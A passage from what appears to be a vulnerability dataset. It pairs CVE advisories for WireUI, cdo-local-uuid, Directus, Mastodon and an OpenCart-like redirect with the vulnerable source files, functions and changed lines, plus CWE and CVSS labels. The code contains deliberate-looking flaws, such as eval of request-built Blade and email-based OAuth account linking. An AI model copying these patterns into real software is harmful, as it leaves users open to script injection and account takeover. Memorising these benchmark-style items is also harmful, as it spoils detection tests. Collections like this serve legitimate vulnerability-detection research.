          "line_no": 62,
          "content": "\t\t\t$url = '';"
        },
        {
          "line_no": 64,
          "content": "\t\t\t$url .= http_build_query($args);"
        },
        {
          "line_no": 66,
          "content": "\t\t\t$data['redirect'] = $this->url->link($route, $url);"
        },
        {
          "line_no": 67,
          "content": "\t\t} else {"
        },
        {
          "line_no": 68,
          "content": "\t\t\t$data['redirect'] = '';"
        },
        {
          "line_no": 69,
          "content": "\t\t}"
        },
        {
          "line_no": 129,
          "content": "\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {"
        },
        {
          "line_no": 130,
          "content": "\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];"
        },
        {
          "line_no": 131,
          "content": "\t\t\t} else {"
        },
        {
          "line_no": 132,
          "content": "\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);"
        },
        {
          "line_no": 133,
          "content": "\t\t\t}"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "LOW",
    "cvss_score": 2.1,
    "cvss_version": 4.0
  },
  {
    "id": 1185,
    "cve": "CVE-2024-45803",
    "description": "Wire UI is a library of components and resources to empower Laravel and Livewire application development. A potential Cross-Site Scripting (XSS) vulnerability has been identified in the `/wireui/button` endpoint, specifically through the `label` query parameter. Malicious actors could exploit this vulnerability by injecting JavaScript into the `label` parameter, leading to the execution of arbitrary code in the victim's browser. The `/wireui/button` endpoint dynamically renders button labels based on user-provided input via the `label` query parameter. Due to insufficient sanitization or escaping of this input, an attacker can inject malicious JavaScript. By crafting such a request, an attacker can inject arbitrary code that will be executed by the browser when the endpoint is accessed. If exploited, this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the affected website. This could lead to: **Session Hijacking**: Stealing session cookies, tokens, or other sensitive information. **User Impersonation**: Performing unauthorized actions on behalf of authenticated users. **Phishing**: Redirecting users to malicious websites. **Content Manipulation**: Altering the appearance or behavior of the affected page to mislead users or execute further attacks. The severity of this vulnerability depends on the context of where the affected component is used, but in all cases, it poses a significant risk to user security. This issue has been addressed in release versions 1.19.3 and 2.1.3. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Http/Controllers/ButtonController.php",
          "content": "<?php\n\nnamespace WireUi\\Http\\Controllers;\n\nuse Illuminate\\Http\\Response;\nuse Illuminate\\View\\ComponentAttributeBag;\nuse WireUi\\Http\\Requests\\ButtonRequest;\nuse WireUi\\Support\\BladeCompiler;\n\nclass ButtonController extends Controller\n{\n    private BladeCompiler $compiler;\n\n    public function __construct(BladeCompiler $compiler)\n    {\n        $this->compiler = $compiler;\n    }\n\n    public function __invoke(ButtonRequest $request): Response\n    {\n        $blade = <<<EOT\n            <x-dynamic-component\n                :component=\"WireUi::component('button')\"\n                {$this->attributes($request->all())->toHtml()}\n            />\n        EOT;\n\n        $html = $this->compiler->compile($blade);\n\n        return response($html)->withHeaders([\n            'Content-Type' => 'text/html; charset=utf-8',\n            'Cache-Control' => 'public, only-if-cached, max-age=31536000',\n        ]);\n    }\n\n    protected function attributes(array $attributes): ComponentAttributeBag\n    {\n        $attributes = new ComponentAttributeBag($attributes);\n\n        return $attributes->whereDoesntStartWith(':');\n    }\n}\n"
        },
        {
          "name": "src/Support/BladeCompiler.php",
          "content": "<?php\n\nnamespace WireUi\\Support;\n\nuse Exception;\nuse Illuminate\\Support\\Facades\\Blade;\nuse Illuminate\\View\\Factory;\nuse Throwable;\n\nclass BladeCompiler\n{\n    public function compile(string $html, array $data = []): string\n    {\n        $safeHtml = (new SafeEval)->evaluate($html);\n\n        $blade = Blade::compileString($safeHtml);\n\n        return $this->compileString($blade, $data);\n    }\n\n    private function compileString(string $blade, array $data): string\n    {\n        $data['__env'] = app(Factory::class);\n\n        $obLevel = ob_get_level();\n\n        ob_start();\n\n        extract($data, EXTR_SKIP);\n\n        try {\n            eval(\"?> {$blade}\");\n        } catch (Exception $e) {\n            while (ob_get_level() > $obLevel) {\n                ob_end_clean();\n            }\n\n            throw $e;\n        } catch (Throwable $e) {\n            while (ob_get_level() > $obLevel) {\n                ob_end_clean();\n            }\n\n            throw new Exception($e);\n        }\n\n        return ob_get_clean();\n    }\n}\n"
        },
        {
          "name": "src/Support/SafeEval.php",
          "content": "<?php\n\nnamespace WireUi\\Support;\n\nuse Illuminate\\Support\\Str;\n\nclass SafeEval\n{\n    public const DIRECTIVES_REGEX = '/\\B@(@?\\w+(?:::\\w+)?)([ \\t]*)(\\( ( (?>[^()]+) | (?3) )* \\))?/x';\n\n    private const SECURITY_REPLACES = ['{{{', '}}}', '{{', '}}', '{!!', '!!}', '<?php', '<?=', '<?', '?>'];\n\n    public function evaluate(string $code): string\n    {\n        return Str::of($code)->replace(self::SECURITY_REPLACES, '')->replaceMatches(self::DIRECTIVES_REGEX, '');\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function __construct(BladeCompiler $compiler)\n    {\n        $this->compiler = $compiler;\n    }",
        "public function __invoke(ButtonRequest $request): Response\n    {\n        $blade = <<<EOT\n            <x-dynamic-component\n                :component=\"WireUi::component('button')\"\n                {$this->attributes($request->all())->toHtml()}\n            />\n        EOT;\n\n        $html = $this->compiler->compile($blade);\n\n        return response($html)->withHeaders([\n            'Content-Type' => 'text/html; charset=utf-8',\n            'Cache-Control' => 'public, only-if-cached, max-age=31536000',\n        ]);\n    }",
        "protected function attributes(array $attributes): ComponentAttributeBag\n    {\n        $attributes = new ComponentAttributeBag($attributes);\n\n        return $attributes->whereDoesntStartWith(':');\n    }",
        "public function compile(string $html, array $data = []): string\n    {\n        $safeHtml = (new SafeEval)->evaluate($html);\n\n        $blade = Blade::compileString($safeHtml);\n\n        return $this->compileString($blade, $data);\n    }",
        "private function compileString(string $blade, array $data): string\n    {\n        $data['__env'] = app(Factory::class);\n\n        $obLevel = ob_get_level();\n\n        ob_start();\n\n        extract($data, EXTR_SKIP);\n\n        try {\n            eval(\"?> {$blade}\");\n        } catch (Exception $e) {\n            while (ob_get_level() > $obLevel) {\n                ob_end_clean();\n            }\n\n            throw $e;\n        } catch (Throwable $e) {\n            while (ob_get_level() > $obLevel) {\n                ob_end_clean();\n            }\n\n            throw new Exception($e);\n        }\n\n        return ob_get_clean();\n    }",
        "public function evaluate(string $code): string\n    {\n        return Str::of($code)->replace(self::SECURITY_REPLACES, '')->replaceMatches(self::DIRECTIVES_REGEX, '');\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 14,
          "content": "    public function __construct(BladeCompiler $compiler)"
        },
        {
          "line_no": 15,
          "content": "    {"
        },
        {
          "line_no": 16,
          "content": "        $this->compiler = $compiler;"
        },
        {
          "line_no": 17,
          "content": "    }"
        },
        {
          "line_no": 21,
          "content": "        $blade = <<<EOT"
        },
        {
          "line_no": 24,
          "content": "                {$this->attributes($request->all())->toHtml()}"
        },
        {
          "line_no": 26,
          "content": "        EOT;"
        },
        {
          "line_no": 28,
          "content": "        $html = $this->compiler->compile($blade);"
        },
        {
          "line_no": 36,
          "content": "    protected function attributes(array $attributes): ComponentAttributeBag"
        },
        {
          "line_no": 37,
          "content": "    {"
        },
        {
          "line_no": 38,
          "content": "        $attributes = new ComponentAttributeBag($attributes);"
        },
        {
          "line_no": 40,
          "content": "        return $attributes->whereDoesntStartWith(':');"
        },
        {
          "line_no": 41,
          "content": "    }"
        },
        {
          "line_no": 12,
          "content": "    public function compile(string $html, array $data = []): string"
        },
        {
          "line_no": 13,
          "content": "    {"
        },
        {
          "line_no": 14,
          "content": "        $safeHtml = (new SafeEval)->evaluate($html);"
        },
        {
          "line_no": 16,
          "content": "        $blade = Blade::compileString($safeHtml);"
        },
        {
          "line_no": 18,
          "content": "        return $this->compileString($blade, $data);"
        },
        {
          "line_no": 19,
          "content": "    }"
        },
        {
          "line_no": 21,
          "content": "    private function compileString(string $blade, array $data): string"
        },
        {
          "line_no": 22,
          "content": "    {"
        },
        {
          "line_no": 23,
          "content": "        $data['__env'] = app(Factory::class);"
        },
        {
          "line_no": 25,
          "content": "        $obLevel = ob_get_level();"
        },
        {
          "line_no": 27,
          "content": "        ob_start();"
        },
        {
          "line_no": 29,
          "content": "        extract($data, EXTR_SKIP);"
        },
        {
          "line_no": 31,
          "content": "        try {"
        },
        {
          "line_no": 32,
          "content": "            eval(\"?> {$blade}\");"
        },
        {
          "line_no": 33,
          "content": "        } catch (Exception $e) {"
        },
        {
          "line_no": 34,
          "content": "            while (ob_get_level() > $obLevel) {"
        },
        {
          "line_no": 35,
          "content": "                ob_end_clean();"
        },
        {
          "line_no": 36,
          "content": "            }"
        },
        {
          "line_no": 38,
          "content": "            throw $e;"
        },
        {
          "line_no": 39,
          "content": "        } catch (Throwable $e) {"
        },
        {
          "line_no": 40,
          "content": "            while (ob_get_level() > $obLevel) {"
        },
        {
          "line_no": 41,
          "content": "                ob_end_clean();"
        },
        {
          "line_no": 42,
          "content": "            }"
        },
        {
          "line_no": 44,
          "content": "            throw new Exception($e);"
        },
        {
          "line_no": 45,
          "content": "        }"
        },
        {
          "line_no": 47,
          "content": "        return ob_get_clean();"
        },
        {
          "line_no": 48,
          "content": "    }"
        },
        {
          "line_no": 13,
          "content": "    public function evaluate(string $code): string"
        },
        {
          "line_no": 14,
          "content": "    {"
        },
        {
          "line_no": 15,
          "content": "        return Str::of($code)->replace(self::SECURITY_REPLACES, '')->replaceMatches(self::DIRECTIVES_REGEX, '');"
        },
        {
          "line_no": 16,
          "content": "    }"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.1,
    "cvss_version": 4.0
  },
  {
    "id": 53,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# Portions of this file contributed by NIST are governed by the following\n# statement:\n#\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to Title 17 Section 105 of the\n# United States Code, this software is not subject to copyright\n# protection within the United States. NIST assumes no responsibility\n# whatsoever for its use by other parties, and makes no guarantees,\n# expressed or implied, about its quality, reliability, or any other\n# characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\nThe function local_uuid() should be used in code where a user could be expected to opt in to non-random UUIDs.\n\"\"\"\n\n__version__ = \"0.4.0\"\n\n__all__ = [\"configure\", \"local_uuid\"]\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef _demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    This function is not intended to be called outside of this module.  Instead, local_uuid() should be called.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return _demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 100,
          "content": "        try:"
        },
        {
          "line_no": 106,
          "content": "        except ValueError:"
        },
        {
          "line_no": 107,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 108,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 404,
    "cve": "CVE-2024-27296",
    "description": "Directus is a real-time API and App dashboard for managing SQL database content. Prior to version 10.8.3, the exact Directus version number was being shipped in compiled JS bundles which are accessible without authentication. With this information a malicious attacker can trivially look for known vulnerabilities in Directus core or any of its shipped dependencies in that specific running version. The problem has been resolved in versions 10.8.3 and newer.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/src/main.ts",
          "content": "/* eslint-disable no-console */\n\nimport { getVueComponentName } from '@/utils/get-vue-component-name';\nimport { createPinia } from 'pinia';\nimport { createHead } from '@unhead/vue';\nimport { createApp } from 'vue';\nimport App from './app.vue';\nimport { registerComponents } from './components/register';\nimport { DIRECTUS_LOGO } from './constants';\nimport { registerDirectives } from './directives/register';\nimport { loadExtensions, registerExtensions } from './extensions';\nimport { i18n } from './lang/';\nimport { router } from './router';\nimport './styles/main.scss';\nimport { registerViews } from './views/register';\n\ninit();\n\nasync function init() {\n\tconst version = __DIRECTUS_VERSION__;\n\n\tconsole.log(DIRECTUS_LOGO);\n\n\tconsole.info(\n\t\t`Hey! Interested in helping build this open-source data management platform?\\nIf so, join our growing team of contributors at: https://directus.chat`,\n\t);\n\n\tif (import.meta.env.DEV) {\n\t\tconsole.info(`%c🐰 Starting Directus v${version}...`, 'color:Green');\n\t} else {\n\t\tconsole.info(`%c🐰 Starting Directus...`, 'color:Green');\n\t}\n\n\tconsole.time('🕓 Application Loaded');\n\n\tconst app = createApp(App);\n\n\tapp.use(i18n);\n\tapp.use(createPinia());\n\tapp.use(createHead());\n\n\tapp.config.errorHandler = (err, vm, info) => {\n\t\tconst source = getVueComponentName(vm);\n\t\tconsole.warn(`[app-${source}-error] ${info}`);\n\t\tconsole.warn(err);\n\t\treturn false;\n\t};\n\n\tregisterDirectives(app);\n\tregisterComponents(app);\n\tregisterViews(app);\n\n\tawait loadExtensions();\n\tregisterExtensions(app);\n\n\t// Add router after loading of extensions to ensure all routes are registered\n\tapp.use(router);\n\n\tapp.mount('#app');\n\n\tconsole.timeEnd('🕓 Application Loaded');\n\n\tconsole.group(`%c✨ Project Information`, 'color:DodgerBlue'); // groupCollapsed\n\n\tif (import.meta.env.DEV) {\n\t\tconsole.info(`%cVersion: v${version}`, 'color:DodgerBlue');\n\t}\n\n\tconsole.info(`%cEnvironment: ${import.meta.env.MODE}`, 'color:DodgerBlue');\n\tconsole.groupEnd();\n\n\t// Prevent the browser from opening files that are dragged on the window\n\twindow.addEventListener('dragover', (e) => e.preventDefault(), false);\n\twindow.addEventListener('drop', (e) => e.preventDefault(), false);\n}\n"
        }
      ],
      "method_level": [
        "init"
      ],
      "hunk_level": [
        {
          "line_no": 20,
          "content": "\tconst version = __DIRECTUS_VERSION__;"
        },
        {
          "line_no": 28,
          "content": "\tif (import.meta.env.DEV) {"
        },
        {
          "line_no": 29,
          "content": "\t\tconsole.info(`%c🐰 Starting Directus v${version}...`, 'color:Green');"
        },
        {
          "line_no": 30,
          "content": "\t} else {"
        },
        {
          "line_no": 31,
          "content": "\t\tconsole.info(`%c🐰 Starting Directus...`, 'color:Green');"
        },
        {
          "line_no": 32,
          "content": "\t}"
        }
      ]
    },
    "cwe": [
      "CWE-200"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 290,
    "cve": "CVE-2024-25618",
    "description": "Mastodon is a free, open-source social network server based on ActivityPub. Mastodon allows new identities from configured authentication providers (CAS, SAML, OIDC) to attach to existing local users with the same e-mail address. This results in a possible account takeover if the authentication provider allows changing the e-mail address or multiple authentication providers are configured. When a user logs in through an external authentication provider for the first time, Mastodon checks the e-mail address passed by the provider to find an existing account. However, using the e-mail address alone means that if the authentication provider allows changing the e-mail address of an account, the Mastodon account can immediately be hijacked. All users logging in through external authentication providers are affected. The severity is medium, as it also requires the external authentication provider to misbehave. However, some well-known OIDC providers (like Microsoft Azure) make it very easy to accidentally allow unverified e-mail changes. Moreover, OpenID Connect also allows dynamic client registration. This issue has been addressed in versions 4.2.6, 4.1.14, 4.0.14, and 3.5.18. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/controllers/auth/omniauth_callbacks_controller.rb",
          "content": "# frozen_string_literal: true\n\nclass Auth::OmniauthCallbacksController < Devise::OmniauthCallbacksController\n  skip_before_action :check_self_destruct!\n  skip_before_action :verify_authenticity_token\n\n  def self.provides_callback_for(provider)\n    define_method provider do\n      @provider = provider\n      @user = User.find_for_oauth(request.env['omniauth.auth'], current_user)\n\n      if @user.persisted?\n        record_login_activity\n        sign_in_and_redirect @user, event: :authentication\n        set_flash_message(:notice, :success, kind: label_for_provider) if is_navigational_format?\n      else\n        session[\"devise.#{provider}_data\"] = request.env['omniauth.auth']\n        redirect_to new_user_registration_url\n      end\n    end\n  end\n\n  Devise.omniauth_configs.each_key do |provider|\n    provides_callback_for provider\n  end\n\n  def after_sign_in_path_for(resource)\n    if resource.email_present?\n      stored_location_for(resource) || root_path\n    else\n      auth_setup_path(missing_email: '1')\n    end\n  end\n\n  private\n\n  def record_login_activity\n    LoginActivity.create(\n      user: @user,\n      success: true,\n      authentication_method: :omniauth,\n      provider: @provider,\n      ip: request.remote_ip,\n      user_agent: request.user_agent\n    )\n  end\n\n  def label_for_provider\n    provider_display_name || configured_provider_name\n  end\n\n  def provider_display_name\n    Devise.omniauth_configs[@provider]&.strategy&.display_name.presence\n  end\n\n  def configured_provider_name\n    I18n.t(\"auth.providers.#{@provider}\", default: @provider.to_s.chomp('_oauth2').capitalize)\n  end\nend\n"
        },
        {
          "name": "app/models/concerns/user/omniauthable.rb",
          "content": "# frozen_string_literal: true\n\nmodule User::Omniauthable\n  extend ActiveSupport::Concern\n\n  TEMP_EMAIL_PREFIX = 'change@me'\n  TEMP_EMAIL_REGEX  = /\\A#{TEMP_EMAIL_PREFIX}/\n\n  included do\n    devise :omniauthable\n\n    def omniauth_providers\n      Devise.omniauth_configs.keys\n    end\n\n    def email_present?\n      email && email !~ TEMP_EMAIL_REGEX\n    end\n  end\n\n  class_methods do\n    def find_for_oauth(auth, signed_in_resource = nil)\n      # EOLE-SSO Patch\n      auth.uid = (auth.uid[0][:uid] || auth.uid[0][:user]) if auth.uid.is_a? Hashie::Array\n      identity = Identity.find_for_oauth(auth)\n\n      # If a signed_in_resource is provided it always overrides the existing user\n      # to prevent the identity being locked with accidentally created accounts.\n      # Note that this may leave zombie accounts (with no associated identity) which\n      # can be cleaned up at a later date.\n      user   = signed_in_resource || identity.user\n      user ||= create_for_oauth(auth)\n\n      if identity.user.nil?\n        identity.user = user\n        identity.save!\n      end\n\n      user\n    end\n\n    def create_for_oauth(auth)\n      # Check if the user exists with provided email. If no email was provided,\n      # we assign a temporary email and ask the user to verify it on\n      # the next step via Auth::SetupController.show\n\n      strategy          = Devise.omniauth_configs[auth.provider.to_sym].strategy\n      assume_verified   = strategy&.security&.assume_email_is_verified\n      email_is_verified = auth.info.verified || auth.info.verified_email || auth.info.email_verified || assume_verified\n      email             = auth.info.verified_email || auth.info.email\n\n      user = User.find_by(email: email) if email_is_verified\n\n      return user unless user.nil?\n\n      user = User.new(user_params_from_auth(email, auth))\n\n      begin\n        user.account.avatar_remote_url = auth.info.image if /\\A#{URI::DEFAULT_PARSER.make_regexp(%w(http https))}\\z/.match?(auth.info.image)\n      rescue Mastodon::UnexpectedResponseError\n        user.account.avatar_remote_url = nil\n      end\n\n      user.mark_email_as_confirmed! if email_is_verified\n      user.save!\n      user\n    end\n\n    private\n\n    def user_params_from_auth(email, auth)\n      {\n        email: email || \"#{TEMP_EMAIL_PREFIX}-#{auth.uid}-#{auth.provider}.com\",\n        agreement: true,\n        external: true,\n        account_attributes: {\n          username: ensure_unique_username(ensure_valid_username(auth.uid)),\n          display_name: auth.info.full_name || auth.info.name || [auth.info.first_name, auth.info.last_name].join(' '),\n        },\n      }\n    end\n\n    def ensure_unique_username(starting_username)\n      username = starting_username\n      i        = 0\n\n      while Account.exists?(username: username, domain: nil)\n        i       += 1\n        username = \"#{starting_username}_#{i}\"\n      end\n\n      username\n    end\n\n    def ensure_valid_username(starting_username)\n      starting_username = starting_username.split('@')[0]\n      temp_username = starting_username.gsub(/[^a-z0-9_]+/i, '')\n      temp_username.truncate(30, omission: '')\n    end\n  end\nend\n"
        },
        {
          "name": "app/models/identity.rb",
          "content": "# frozen_string_literal: true\n\n# == Schema Information\n#\n# Table name: identities\n#\n#  provider   :string           default(\"\"), not null\n#  uid        :string           default(\"\"), not null\n#  created_at :datetime         not null\n#  updated_at :datetime         not null\n#  id         :bigint(8)        not null, primary key\n#  user_id    :bigint(8)\n#\n\nclass Identity < ApplicationRecord\n  belongs_to :user\n  validates :uid, presence: true, uniqueness: { scope: :provider }\n  validates :provider, presence: true\n\n  def self.find_for_oauth(auth)\n    find_or_create_by(uid: auth.uid, provider: auth.provider)\n  end\nend\n"
        }
      ],
      "method_level": [
        "def self.provides_callback_for(provider)\n    define_method provider do\n      @provider = provider\n      @user = User.find_for_oauth(request.env['omniauth.auth'], current_user)\n\n      if @user.persisted?\n        record_login_activity\n        sign_in_and_redirect @user, event: :authentication\n        set_flash_message(:notice, :success, kind: label_for_provider) if is_navigational_format?\n      else\n        session[\"devise.#{provider}_data\"] = request.env['omniauth.auth']\n        redirect_to new_user_registration_url\n      end\n    end\n  end",
        "def find_for_oauth(auth, signed_in_resource = nil)\n      # EOLE-SSO Patch\n      auth.uid = (auth.uid[0][:uid] || auth.uid[0][:user]) if auth.uid.is_a? Hashie::Array\n      identity = Identity.find_for_oauth(auth)\n\n      # If a signed_in_resource is provided it always overrides the existing user\n      # to prevent the identity being locked with accidentally created accounts.\n      # Note that this may leave zombie accounts (with no associated identity) which\n      # can be cleaned up at a later date.\n      user   = signed_in_resource || identity.user\n      user ||= create_for_oauth(auth)\n\n      if identity.user.nil?\n        identity.user = user\n        identity.save!\n      end\n\n      user\n    end",
